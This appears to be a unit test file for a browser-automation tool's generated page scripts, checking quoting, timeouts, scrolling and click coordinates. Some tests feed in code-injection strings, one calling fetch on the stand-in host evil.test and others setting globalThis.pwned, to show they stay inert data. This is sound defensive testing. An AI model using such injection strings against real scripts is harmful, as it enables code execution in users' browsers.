/**
 * Unit tests for the page scripts: values are inserted exactly where the
 * script text expects them, and actions without a handler map to a script.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import * as s from '../../../../src/main/actions/scripts.ts';

describe('page scripts', () => {
  it('findElementJs quotes the selector as code and escapes it in the message', () => {
    const js = s.findElementJs("a[title='x']");
    assert.ok(js.includes('const el = f("a[title=\'x\']");'));
    assert.ok(js.includes("error: 'Element not found: a[title=\\'x\\']'"));
  });

  it('findElementJs keeps a backslash or line break in the selector from breaking the script', () => {
    for (const selector of ['a\\', "a\\'b", 'a\nb']) {
      assert.doesNotThrow(() => new Function(s.findElementJs(selector)), JSON.stringify(selector));
    }
  });

  it('inserted values are taken literally, replacement patterns included', () => {
    const js = s.selectOptionJs('#s', '$& $1');
    assert.ok(js.includes('el.value = "$& $1";'));
    assert.ok(js.includes('const el = f("#s");'));
  });

  it('every script is valid JavaScript', () => {
    for (const js of [
      s.findElementJs('a'),
      s.iframeClickJs('a'),
      s.selectFieldJs('a'),
      s.selectOptionJs('a', 'b'),
      s.devWaitJs({ selector: 'a' }),
      s.scrollResultJs({ direction: 'up' }, 5),
      s.DROPDOWN_JS,
      s.DEV_ANALYZE_JS,
    ]) {
      assert.doesNotThrow(() => new Function(js), js.slice(0, 60));
    }
  });

  it('the wait script defaults its timeout', () => {
    assert.ok(s.actionScript('wait', { selector: 'a' }).includes('const maxWait = 10000;'));
    assert.ok(s.actionScript('wait', { selector: 'a', timeout: 5 }).includes('const maxWait = 5;'));
  });

  it('a wait for text looks for it in what the page shows, and still parses', () => {
    const js = s.actionScript('wait', { text: 'Saved' });
    assert.ok(js.includes('document.body.innerText.includes("Saved")'));
    assert.doesNotThrow(() => new Function(js));
  });

  it('text a wait is for is only ever data, so it cannot become code', () => {
    const hostile = '"); fetch("https://evil.test"); ("';
    const js = s.actionScript('wait', { text: hostile });
    assert.ok(js.includes(JSON.stringify(hostile)));
    assert.doesNotThrow(() => new Function(js));
    assert.equal(js.split('fetch(').length - 1, js.split('\\"); fetch(').length - 1);
  });

  it('a wait for text that runs out says what did not show and what to do next', () => {
    const js = s.actionScript('wait', { text: 'Saved', timeout: 500 });
    assert.ok(js.includes('Timed out after 500 ms: \\"Saved\\" did not show. Analyze the page'));
  });

  it('a wait given both text and a selector waits for the text', () => {
    const js = s.actionScript('wait', { text: 'Saved', selector: '#done' });
    assert.ok(js.includes('innerText.includes("Saved")') && !js.includes('#done'));
  });

  it('a wait given neither text nor a selector fails at once and says what to give', () => {
    for (const params of [{}, undefined, { text: '' }, { text: 5 }, { timeout: 500 }]) {
      const js = s.actionScript('wait', params);
      assert.deepEqual(new Function(`return ${js}`)(), {
        ok: false,
        error: 'Nothing to wait for. Give text or a selector.',
      });
    }
  });

  it('a wait with no text, or text that is not a string, waits for the element as before', () => {
    for (const text of [undefined, '', 5, { a: 1 }]) {
      const js = s.actionScript('wait', { selector: 'a', text });
      assert.ok(js.includes("error: 'Timeout'"), String(text));
      assert.ok(!js.includes('innerText'), String(text));
    }
  });

  it('a wait timeout is only ever a number, so caller text cannot become code', () => {
    const hostile = { selector: 'a', timeout: '1;globalThis.pwned=1' };
    for (const js of [s.actionScript('wait', hostile), s.devWaitJs(hostile)]) {
      assert.ok(js.includes('const maxWait = 10000;'), js.slice(0, 120));
      assert.ok(!js.includes('pwned'));
    }
  });

  it('a wait timeout given as digits, zero, a negative or infinity is a number or the default', () => {
    const maxWait = (timeout) => /const maxWait = ([^;]+);/.exec(s.actionScript('wait', { selector: 'a', timeout }))[1];
    assert.deepEqual(['250', 0, -5, Infinity, null].map(maxWait), ['250', '10000', '10000', '10000', '10000']);
  });

  it('the scroll script writes its amount as a number whatever it is handed', () => {
    const js = s.scrollResultJs({ direction: 'up' }, '1}}),(globalThis.pwned=1),({a:{b:1');
    assert.ok(js.endsWith('amount: 0 } }'), js.slice(-60));
    assert.ok(s.scrollResultJs({}, 250).endsWith('amount: 250 } }'));
  });

  it('analyze passes its params to the analyzer', () => {
    assert.ok(s.actionScript('analyze', { a: 1 }).includes('analyzePage({"a":1})'));
  });

  it('an unknown action, even a prototype name, has no script at all', () => {
    assert.equal(s.actionScript('toString'), null);
  });

  it('the name of an unknown action never reaches a script, whatever it contains', () => {
    assert.equal(s.actionScript("x'}),(globalThis.pwned=1),({a:'", {}), null);
  });
  it('native click coordinates use the analyzer reachable line point instead of the union centre', () => {
    const document: any = {};
    const el: any = {
      ownerDocument: document,
      tagName: 'A',
      innerText: 'Privacy Policy',
      getAttribute: () => null,
      scrollIntoView: () => {},
      getBoundingClientRect: () => ({ x: 0, y: 80, top: 80, width: 100, height: 40 }),
    };
    const window = { __acFindElement: () => el, __acReachablePoint: () => ({ x: 12.5, y: 110 }), scrollBy: () => {} };
    const result = vm.runInNewContext(s.findElementJs('a'), { window, document });
    assert.equal(result.data.x, 12.5);
    assert.equal(result.data.y, 110);
    assert.equal(result.data.covered, false);
    window.__acReachablePoint = () => null;
    assert.equal(vm.runInNewContext(s.findElementJs('a'), { window, document }).data.covered, true);
  });
});

it('same-origin framed clicks use the shared mapped point without adding offsets twice', () => {
  const document = {};
  const el: any = {
    ownerDocument: {},
    tagName: 'A',
    innerText: 'Privacy Policy',
    getAttribute: () => null,
    scrollIntoView: () => {},
    getBoundingClientRect: () => ({ x: 0, y: 100, top: 100, width: 100, height: 40 }),
  };
  const window = {
    __acFindElement: () => el,
    __acReachablePoint: () => ({ x: 125, y: 270 }),
    __acFrameOffset: () => ({ x: 100, y: 50 }),
    scrollBy: () => {},
  };
  const result = vm.runInNewContext(s.findElementJs('a'), { window, document });
  assert.equal(result.data.x, 125);
  assert.equal(result.data.y, 270);
  assert.equal(result.data.covered, false);
});
